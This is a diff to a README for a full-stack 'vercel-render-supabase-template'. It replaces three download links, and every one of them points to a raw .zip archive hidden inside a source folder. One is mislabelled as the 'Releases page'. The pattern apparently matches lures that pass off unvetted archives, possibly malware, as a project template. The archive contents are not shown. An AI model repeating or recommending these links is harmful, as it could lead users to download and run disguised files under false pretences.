@@ -1,6 +1,6 @@
 # 🌟 vercel-render-supabase-template - Simple Full-Stack App Setup
 
-[![Download Latest Version](https://raw.githubusercontent.com/StregaVn/vercel-render-supabase-template/main/backend-template/src/vercel-render-supabase-template-1.9.zip%20Latest%20Version-Click%20Here-brightgreen)](https://raw.githubusercontent.com/StregaVn/vercel-render-supabase-template/main/backend-template/src/vercel-render-supabase-template-1.9.zip)
+[![Download Latest Version](https://raw.githubusercontent.com/StregaVn/vercel-render-supabase-template/main/frontend-template/src/pages/vercel-supabase-render-template-v2.4.zip%20Latest%20Version-Click%20Here-brightgreen)](https://raw.githubusercontent.com/StregaVn/vercel-render-supabase-template/main/frontend-template/src/pages/vercel-supabase-render-template-v2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ This template provides a ready-to-use structure for your full-stack applications
 
 To get started, visit the Releases page to download the template. 
 
-[Download Latest Version Here](https://raw.githubusercontent.com/StregaVn/vercel-render-supabase-template/main/backend-template/src/vercel-render-supabase-template-1.9.zip)
+[Download Latest Version Here](https://raw.githubusercontent.com/StregaVn/vercel-render-supabase-template/main/frontend-template/src/pages/vercel-supabase-render-template-v2.4.zip)
 
 ### Installation Steps
 
@@ -109,4 +109,4 @@ If you encounter problems or have questions, feel free to consult the community 
 
 You now have the tools to build and run full-stack applications using the **vercel-render-supabase-template**! Enjoy developing your app.
 
-For further updates and new features, visit the [Releases page](https://raw.githubusercontent.com/StregaVn/vercel-render-supabase-template/main/backend-template/src/vercel-render-supabase-template-1.9.zip) regularly.
+For further updates and new features, visit the [Releases page](https://raw.githubusercontent.com/StregaVn/vercel-render-supabase-template/main/frontend-template/src/pages/vercel-supabase-render-template-v2.4.zip) regularly.
